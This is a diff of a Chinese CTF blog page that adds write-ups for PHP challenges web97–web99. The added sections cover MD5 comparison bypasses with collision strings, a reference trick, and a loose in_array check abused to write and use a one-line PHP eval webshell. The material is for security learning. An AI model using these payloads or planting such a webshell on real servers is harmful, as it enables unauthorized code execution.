@@ -29,7 +29,7 @@
 <meta property="og:description" content="前言为了继续巩固php基础！">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-12-14T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-12-15T16:53:03.166Z">
+<meta property="article:modified_time" content="2022-12-16T10:02:50.439Z">
 <meta property="article:author" content="Bron">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PHP">
@@ -224,7 +224,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-12-16 00:53:03" itemprop="dateModified" datetime="2022-12-16T00:53:03+08:00">2022-12-16</time>
+                <time title="修改时间：2022-12-16 18:02:50" itemprop="dateModified" datetime="2022-12-16T18:02:50+08:00">2022-12-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -253,14 +253,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.3k</span>
+              <span>9.9k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
+              <span>9 分钟</span>
             </span>
 
         </div>
@@ -314,7 +314,57 @@
 <p>题目中增加的条件是：num参数中必须包含0，但不能在首位，于是我们可以在八进制前添加一个空格绕过：<br><code>?num= 010574</code><br>或者将数字0添加到小数点后：<br><code>?num=4476.01</code><br>均可拿到flag</p>
 <h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p>这一题和web94差不多，只不过把小数点过滤了，不能使用浮点数，但可以在八进制前面加上空格之类的绕过<br><code>?num= 010574</code><br>拿到flag</p>
 <h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p>看到highlight_file()函数，想到文件包含<br>所以直接构造文件包含的语句：<br><code>?u=php://filter/convert.base64-encode/resource=flag.php</code><br>得到的数据经过base64解码即可拿到flag<br>或者使用相对路径： <code>?u=./flag.php</code><br>或者使用绝对路径： <code>?u=/var/www/html/flag.php</code><br>均可拿到flag</p>
-<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1>
+<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><ol>
+<li><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>这一题是需要通过POST传入a，b两个参数。<br>条件是值不能相等，且md5值要相等。</p>
+</li>
+<li><p>构造payload<br>抓包将头部的GET改为POST，然后添加：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+<p>最后我们有两种构造方法来传参</p>
+</li>
+</ol>
+<ul>
+<li><p>第1种（php中hash比较缺陷）<br>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是强相等的。<br>由此可以构造出：<br><code>a[]=1&amp;b[]=2</code><br>报错并且成功拿到flag</p>
+</li>
+<li><p>第2种（生成MD5相同但内容不同的2个文件）<br>用md5-fastcoll工具可以生成MD5相同但内容不同的两个文件，编写python脚本提取文件内容，并进行url编码就行了。<br>以下是几个MD5相同但内容不同的字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br><span class="line"></span><br><span class="line">%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab</span><br><span class="line"></span><br><span class="line">%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br></pre></td></tr></table></figure>
+<p>构造成payload即可拿到flag</p>
+</li>
+</ul>
+<p><strong>题外话</strong></p>
+<ul>
+<li>如果是MD5弱比较，使用强制类型转换后不再接收数组：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。</span><br><span class="line">payload: a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure></li>
+<li>md5强碰撞<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) )&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">这时候需要找到两个真正的md5值相同数据</span><br><span class="line"></span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><ol>
+<li><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>考点是PHP的三元运算符和传址(引用) 传址(引用)有点像c语言里面的地址<br>第2行代码的意思是：只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)<br>第3,4行代码用处不大，因为我们不传入flag参数<br>第5行代码的意思是POST型提交一个HTTP_FLAG&#x3D;flag,由于get不会验证，所以随便填个1&#x3D;1就好。</p>
+</li>
+<li><p>构造payload<br>抓包，将头部的GET改为POST，并且添加Content-Type<br>GET型 <code>1=1</code><br>POST型 <code>HTTP_FLAG=flag</code><br>拿到flag</p>
+</li>
+</ol>
+<h1 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h1><ol>
+<li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li><p>array_push()函数<br>将一个或多个单元压入数组的末尾（入栈）<br><code>array_push(array &amp;$array, mixed $value1, mixed $... = ?): int</code><br>array_push() 将 array 当成一个栈，并将传入的变量压入 array 的末尾。array 的长度将根据入栈变量的数目增加。</p>
+</li>
+<li><p>in_array()函数<br>检查数组中是否存在某个值<br><code>in_array(mixed $needle, array $haystack, bool $strict = false): bool</code><br>如果没有设置 strict 则使用宽松的比较。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">needle</span><br><span class="line">待搜索的值。</span><br><span class="line">注意:</span><br><span class="line">如果 needle 是字符串，则比较是区分大小写的。</span><br><span class="line">haystack</span><br><span class="line">待搜索的数组。</span><br><span class="line">strict</span><br><span class="line">如果第三个参数 strict 的值为 true 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同。</span><br><span class="line">注意:</span><br><span class="line">在 PHP 8.0.0 之前，string needle 在非严格模式下将会匹配数组中的值 0，反之亦然。这可能会导致不希望的结果。其它类型也存在类似的边缘情况。如果不是绝对确定有关值的类型，请始终使用 strict flag 以避免意外行为。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>file_put_contents()函数<br>将数据写入文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(</span><br><span class="line">    string $filename,</span><br><span class="line">    mixed $data,</span><br><span class="line">    int $flags = 0,</span><br><span class="line">    ?resource $context = null</span><br><span class="line">): int|false</span><br></pre></td></tr></table></figure>
+<p>如果 filename 不存在，将会创建文件。反之，存在的文件将会重写，除非设置 FILE_APPEND flag。</p>
+</li>
+</ul>
+<p>通过该源码可知，将随机数放入数组$allow里。<br>get型传参的值与数组$allow作比较，如果在里面，就通过post传参变量content写入文件名变量n内。<br>即创造一个文件，文件名为变量n的值，文件内容为变量content的值。</p>
+<ol start="2">
+<li>构造payload<br>由于in_array数组有缺陷，会把1.php解析为1，由此我们可构造出一个php文件，通过post传参传入一句话木马：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET: ?n=1.php    POST: content:&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+因为是随机数，所以1不一定每次都在数组中，如果失败多试几次便可。<br>然后我们再访问： <code>url/1.php</code><br>成功后打开蚁剑，连接这个url，密码为1。<br>之后找到flag36d.php文件，拿到flag。</li>
+</ol>
+
     </div>
 
     
@@ -465,7 +515,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web89"><span class="nav-number">2.</span> <span class="nav-text">web89</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web90"><span class="nav-number">3.</span> <span class="nav-text">web90</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web91"><span class="nav-number">4.</span> <span class="nav-text">web91</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web92"><span class="nav-number">5.</span> <span class="nav-text">web92</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web93"><span class="nav-number">6.</span> <span class="nav-text">web93</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web94"><span class="nav-number">7.</span> <span class="nav-text">web94</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web95"><span class="nav-number">8.</span> <span class="nav-text">web95</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web96"><span class="nav-number">9.</span> <span class="nav-text">web96</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web97"><span class="nav-number">10.</span> <span class="nav-text">web97</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web89"><span class="nav-number">2.</span> <span class="nav-text">web89</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web90"><span class="nav-number">3.</span> <span class="nav-text">web90</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web91"><span class="nav-number">4.</span> <span class="nav-text">web91</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web92"><span class="nav-number">5.</span> <span class="nav-text">web92</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web93"><span class="nav-number">6.</span> <span class="nav-text">web93</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web94"><span class="nav-number">7.</span> <span class="nav-text">web94</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web95"><span class="nav-number">8.</span> <span class="nav-text">web95</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web96"><span class="nav-number">9.</span> <span class="nav-text">web96</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web97"><span class="nav-number">10.</span> <span class="nav-text">web97</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web98"><span class="nav-number">11.</span> <span class="nav-text">web98</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web99"><span class="nav-number">12.</span> <span class="nav-text">web99</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -552,13 +602,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">177k</span>
+    <span title="站点总字数">183k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">2:41</span>
+    <span title="站点阅读时长">2:47</span>
 </div>
 
 <!--
